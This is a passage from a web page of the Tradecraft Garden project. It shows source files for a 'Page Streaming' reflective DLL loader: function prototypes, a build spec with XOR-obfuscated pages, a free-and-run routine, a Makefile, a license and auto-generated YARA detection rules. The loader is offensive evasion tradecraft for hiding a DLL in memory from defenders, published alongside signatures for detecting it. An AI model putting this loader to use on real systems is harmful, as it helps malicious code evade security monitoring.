functions`<br>```*/`<br>`typedef``BOOL``WINAPI (*DLLMAIN_FUNC)(``HINSTANCE``,``DWORD``,``LPVOID``);`<br>`DLLMAIN_FUNC EntryPoint(DLLDATA * dll,``void``* base);`<br>`IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll,``UINT``entry);`<br>`void``LoadDLL(DLLDATA * dll,``char``* src,``char``* dst);`<br>`void``LoadSections(DLLDATA * dll,``char``* src,``char``* dst);`<br>`void``ParseDLL(``char``* src, DLLDATA * data);`<br>`void``ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll,``char``* dst);`<br>`void``ProcessRelocations(DLLDATA * dll,``char``* src,``char``* dst);`<br>`DWORD``SizeOfDLL(DLLDATA * data);`<br>`/*`<br>```* A macro to figure out our caller`<br>```* https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1`<br>```*/`<br>`#ifdef __MINGW32__`<br>`#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))`<br>`#else`<br>`#pragma intrinsic(_ReturnAddress)`<br>`#define WIN_GET_CALLER() _ReturnAddress()`<br>`#endif` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
loader.spec
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=loader.spec)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78 | `# some meta-info about our capability`<br>`name``"PageStream rDLL"`<br>`describe``"Use VEHs and guard pages to limit DLL visibility in eXecutable memory"`<br>`author``"Raphael Mudge"`<br>`license``"BSD"`<br>`reference``"https://tradecraftgarden.org/pagestream.html"`<br>`x86:`<br>```# load our x86 .o file AND turn it into position-independent code`<br>```load``"bin/loader.x86.o"`<br>```# +gofirst moves go() to position 0 of our PIC`<br>```make``pic +gofirst +optimize`<br>```# bring in PIC Service Module from another project`<br>```run``"../simple_pic/services.spec"`<br>```# merge the Tradecraft Garden Library into our PIC`<br>```mergelib``"../libtcg/libtcg.x86.zip"`<br>```# generate a 16b XOR key for our obfuscated pages`<br>```generate $KEY 16`<br>```# load our guardexec() PICO`<br>```load``"bin/guardexec.x86.o"`<br>```make``object +optimize`<br>```# bring our freeAndRun() functionality into this PICO`<br>```run``"freeandrun.spec"`<br>```# merge the Tradecraft Garden Library into our PICO, +optimize means we're`<br>```# only keeping the functions we use, so it's all right`<br>```mergelib``"../libtcg/libtcg.x86.zip"`<br>```# patch that key into our PICO`<br>```patch``"_xorkey"``$KEY`<br>```# provide a rule hint to our -g yara generator with name, max rules, min agreement`<br>```rule``"TCG_GuardExec"``8 5`<br>```export`<br>```link``"my_guardexec"`<br>``<br>```# load our Reflective DLL argument AND link it into our PICO as my_data section.`<br>```push $DLL`<br>```link``"my_data"`<br>```# opt out the loader component from rule generation. It's not as interesting and LibTCG rules`<br>```# cover it better.`<br>```rule``""``0`<br>```# we're done, export the final blob`<br>```export`<br>`x64:`<br>```load``"bin/loader.x64.o"`<br>```make``pic +gofirst +optimize`<br>```run``"../simple_pic/services.spec"`<br>```mergelib``"../libtcg/libtcg.x64.zip"`<br>```generate $KEY 16`<br>```load``"bin/guardexec.x64.o"`<br>```make``object +optimize`<br>```run``"freeandrun.spec"`<br>```mergelib``"../libtcg/libtcg.x64.zip"`<br>```patch``"xorkey"``$KEY`<br>```rule``"TCG_GuardExec"``8 5`<br>```export`<br>```link``"my_guardexec"`<br>```push $DLL`<br>```link``"my_data"`<br>```rule``""``0`<br>```export` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
free.c
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=free.c)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ÃƒÂ¢Ã‚â‚¬Ã‚Å“AS ISÃƒÂ¢Ã‚â‚¬Ã‚Â AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`#include <windows.h>`<br>`#include "tcg.h"`<br>`WINBASEAPI DECLSPEC_NORETURN``VOID``WINAPI KERNEL32$ExitThread (``DWORD``dwExitCode);`<br>`WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``dwFreeType);`<br>`typedef``BOOL``WINAPI (*DLLMAIN_FUNC)(``HINSTANCE``,``DWORD``,``LPVOID``);`<br>`void``freeAndRun(``char``* loader,``char``* dllEntry,``char``* dllBase) {`<br>```/* free our loader */`<br>```KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);`<br>```/* call the entry point of our Reflective DLL */`<br>```((DLLMAIN_FUNC)dllEntry)((``HINSTANCE``)dllBase, DLL_PROCESS_ATTACH, NULL);`<br>```/* exit the current thread.. else... we return to our free'd() memory and we don't want that. */`<br>```KERNEL32$ExitThread(0);`<br>`}` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
Makefile
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=Makefile)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23 | `CC=i686-w64-mingw32-gcc`<br>`CC_64=x86_64-w64-mingw32-gcc`<br>`CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith`<br>`.PHONY: all x86 x64 clean`<br>`all: x86 x64`<br>`bin:`<br>```mkdir``-p bin`<br>`x86: bin`<br>```$(CC) -DWIN_X86 $(CFLAGS) -c src``/loader``.c -o bin``/loader``.x86.o`<br>```$(CC) -DWIN_X86 $(CFLAGS) -c src``/free``.c -o bin``/free``.x86.o`<br>```$(CC) -DWIN_X86 $(CFLAGS) -c src``/guardexec``.c -o bin``/guardexec``.x86.o`<br>`x64: bin`<br>```$(CC_64) -DWIN_X64 $(CFLAGS) -c src``/loader``.c -o bin``/loader``.x64.o`<br>```$(CC_64) -DWIN_X64 $(CFLAGS) -c src``/free``.c -o bin``/free``.x64.o`<br>```$(CC_64) -DWIN_X64 $(CFLAGS) -c src``/guardexec``.c -o bin``/guardexec``.x64.o`<br>`clean:`<br>```rm``-rf bin` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
LICENSE.txt
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=LICENSE.txt)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25 | `Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>`Redistribution and use in source and binary forms, with or without modification, are`<br>`permitted provided that the following conditions are met:`<br>`1. Redistributions of source code must retain the above copyright notice, this list of`<br>`conditions and the following disclaimer.`<br>`2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>`conditions and the following disclaimer in the documentation and/or other materials provided`<br>`with the distribution.`<br>`3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>`endorse or promote products derived from this software without specific prior written`<br>`permission.`<br>`THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ÃƒÂ¢Ã‚â‚¬Ã‚Å“AS ISÃƒÂ¢Ã‚â‚¬Ã‚Â AND ANY EXPRESS`<br>`OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>`MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>`COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>`EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>`SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>`HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>`TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>`EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
rules.yar
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=rules.yar)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100 | `rule TCG_GuardExec_78518a9c {`<br>```meta:`<br>```description =``"PageStream rDLL: Use VEHs and guard pages to limit DLL visibility in eXecutable memory"`<br>```author =``"Raphael Mudge"`<br>```date =``"2026-02-02"`<br>```reference =``"https://tradecraftgarden.org/pagestream.html"`<br>```arch_context =``"x64"`<br>```scan_context =``"file, memory"`<br>```os =``"windows"`<br>```license =``"BSD"`<br>```generator =``"Crystal Palace"`<br>```strings:`<br>```// ----------------------------------------`<br>```// Function: TrackPage`<br>```// ----------------------------------------`<br>```/*`<br>```* 48 69 C0 56 55 55 55Â Â Â Â Â Â Â Â Â  imul rax, 0x55555556`<br>```* 48 C1 E8 20Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  shr rax, 0x20`<br>```* 89 D1Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  mov ecx, edx`<br>```* C1 F9 1FÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  sar ecx, 0x1F`<br>```* (Score: 144)`<br>```*/`<br>```$r0_TrackPage = { 48 69 C0 56 55 55 55 48 C1 E8 20 89 D1 C1 F9 1F }`<br>```/*`<br>```* 48 8D 35 00 00 00 00Â Â Â Â Â Â Â Â Â  lea rsi, [.bss]`<br>```* 8B 15 18 00 00 00Â Â Â Â Â Â Â Â Â Â Â Â  mov edx, dword ptr [.bss+0x18]`<br>```* 48 63 C2Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  movsxd rax, edx`<br>```* 48 69 C0 56 55 55 55Â Â Â Â Â Â Â Â Â  imul rax, 0x55555556`<br>```* (Score: 146)`<br>```*/`<br>```$r1_TrackPage = { 48 8D 35 ?? ?? ?? ?? 8B 15 ?? ?? ?? ?? 48 63 C2 48 69 C0 56 55 55 55 }`<br>```/*`<br>```* 48 69 D2 56 55 55 55Â Â Â Â Â Â Â Â Â  imul rdx, 0x55555556`<br>```* 48 C1 EA 20Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  shr rdx, 0x20`<br>```* 89 C1Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  mov ecx, eax`<br>```* C1 F9 1FÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  sar ecx, 0x1F`<br>```* (Score: 530)`<br>```*/`<br>```$r2_TrackPage = { 48 69 D2 56 55 55 55 48 C1 EA 20 89 C1 C1 F9 1F }`<br>```// ----------------------------------------`<br>```// Function: VEHHandler`<br>```// ----------------------------------------`<br>```/*`<br>```* 48 8B 11Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  mov rdx, qword ptr [rcx]`<br>```* B8 00 00 00 00Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  mov eax, 0`<br>```* 81 3A 01 00 00 80Â Â Â Â Â Â Â Â Â Â Â Â  cmp dword ptr [rdx], 0x80000001`<br>```* (Score: 521)`<br>```*/`<br>```$r3_VEHHandler = { 48 8B 11 B8 00 00 00 00 81 3A 01 00 00 80 }`<br>```// ----------------------------------------`<br>```// Function: GuardSections`<br>```// ----------------------------------------`<br>```/*`<br>```* 48 8D 58 28Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  lea rbx, [rax+0x28]`<br>```* 8D 52 FFÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  lea edx, [rdx-1]`<br>```* 48 8D 14 92Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  lea rdx, [rdx+rdx*4]`<br>```* 4C 8D 6C D0 50Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  lea r13, [rax+rdx*8+0x50]`<br>```* (Score: 52)`<br>```*/`<br>```$r4_GuardSections = { 48 8D 58 28 8D 52 FF 48 8D 14 92 4C 8D 6C D0 50 }`<br>```/*`<br>```* 8B 73 E4Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  mov esi, dword ptr [rbx-0x1C]`<br>```* 48 8D 7C 35 00Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  lea rdi, [rbp+rsi]`<br>```* 4C 01 E6Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  add rsi, r12`<br>```* 8B 4B E0Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  mov ecx, dword ptr [rbx-0x20]`<br>```* F3 A4Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  rep movsb`<br>```* (Score: 71)`<br>```*/`<br>```$r5_GuardSections = { 8B 73 E4 48 8D 7C 35 00 4C 01 E6 8B 4B E0 F3 A4 }`<br>```/*`<br>```* 25 00 00 00 20Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  and eax, 0x20000000`<br>```* 83 F8 01Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  cmp eax, 1`<br>```* 19 F6Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  sbb esi, esi`<br>```* 83 E6 E4Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  and esi, 0xFFFFFFE4`<br>```* 83 C6 20Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  add esi, 0x20`<br>```* (Score: 150)`<br>```*/`<br>```$r6_GuardSections = { 25 00 00 00 20 83 F8 01 19 F6 83 E6 E4 83 C6 20 }`<br>```// ----------------------------------------`<br>```// Function: go`<br>```// ----------------------------------------`<br>```/*`<br>```* 48 89 D5Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  mov rbp, rdx`<br>```* E8 87 01 00 00Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  call SizeOfDLL`<br>```* 48 8D 15 20 00 00 00Â Â Â Â Â Â Â Â Â  lea rdx, [.bss+0x20]`<br>```* 48 8D 8A 00 02 00 00Â Â Â Â Â Â Â Â Â  lea rcx, [rdx+0x200]`<br>```* (Score: 142)`<br>```*/`<br>```$r7_go = { 48 89 D5 E8 ?? ?? ?? ?? 48 8D 15 ?? ?? ?? ?? 48 8D 8A 00 02 00 00 }`<br>```condition:`<br>```5 of them`<br>`}` |